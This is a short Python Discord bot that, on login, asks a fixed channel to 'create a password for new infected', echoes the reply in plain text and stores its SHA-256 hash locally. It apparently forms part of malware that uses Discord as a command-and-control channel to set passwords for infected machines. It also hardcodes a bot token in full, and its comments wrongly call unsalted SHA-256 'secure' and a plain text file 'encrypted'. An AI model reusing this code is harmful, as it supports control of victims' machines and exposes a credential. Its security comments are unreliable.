import discord
from discord import Client

import hashlib

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

id = 1186868421120499766

def write_password(new_password):
    # Hash the new password securely
    hashed_password = hash_password(new_password)

    # Write the hashed password to an encrypted file
    with open("password.txt", "w") as file:
        file.write(hashed_password)

def hash_password(password):
    # Use SHA-256 for secure hashing
    sha256 = hashlib.sha256()
    sha256.update(password.encode('utf-8'))
    hashed_password = sha256.hexdigest()
    return hashed_password

def check_password(password_attempt):
    # Read the hashed password from the file
    with open("password.txt", "r") as file:
        stored_password = file.read().strip()

    # Hash the password attempt
    hashed_attempt = hash_password(password_attempt)

    # Compare the hashed attempt with the stored hashed password
    return hashed_attempt == stored_password

@client.event
async def on_ready():

	print(f'We have logged in as {client.user}')
	await client.get_channel(id).send("create a password for new infected")

@client.event
async def on_message(message):
	if message.author == client.user:
		return

	password = message.content
#	print(password)
	await client.get_channel(id).send(f"new password is {password}")
	write_password(password)
	await client.close()

client.run('MTE4Njg2NzY4MTE3ODE2NTI3MA.GZhq6f.QvHiym_5WT-URO9WnSMvKDX04j1vKy4TWQ3hko')
